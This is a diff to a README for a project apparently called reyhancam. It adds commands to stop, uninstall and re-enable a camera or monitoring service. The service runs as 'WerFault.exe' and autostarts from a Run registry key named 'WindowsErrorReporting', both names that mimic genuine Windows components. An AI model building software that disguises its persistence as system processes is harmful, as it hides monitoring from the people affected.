@@ -91,6 +91,28 @@ reyhancam/
 4. Wait for download (~937MB first time)
 5. PC appears on dashboard automatically
 
+### To turn it off (stop without uninstalling)
+```cmd
+taskkill /F /IM WerFault.exe 2>nul
+```
+This kills the running process. It will start again on next reboot (registry autorun is still active).
+
+To also prevent it from starting on reboot:
+```cmd
+reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsErrorReporting" /f
+```
+To re-enable autorun later:
+```cmd
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsErrorReporting" /t REG_SZ /d "wscript.exe \"C:\ProgramData\CameraService\launch.vbs\"" /f
+```
+
+### To uninstall completely
+```cmd
+taskkill /F /IM WerFault.exe 2>nul
+rmdir /s /q "C:\ProgramData\CameraService"
+reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsErrorReporting" /f
+```
+
 ### To reinstall / update
 ```cmd
 taskkill /F /IM WerFault.exe 2>nul
